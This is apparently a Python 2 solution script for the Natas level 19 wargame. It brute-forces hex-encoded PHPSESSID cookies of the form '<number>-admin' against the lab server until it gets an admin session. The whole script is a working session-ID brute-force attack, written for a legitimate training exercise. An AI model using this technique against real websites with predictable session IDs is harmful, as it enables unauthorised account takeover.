#!/usr/bin/env python2

import requests
pw = open("pw").read()[:-1] # cut off \n

for i in range(650):
    cur = "{}-admin".format(i)
    cookies = {"PHPSESSID": cur.encode("hex")}
    url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
    print("reqing", url, cookies)
    r = requests.get(url, auth=("natas19", pw), cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
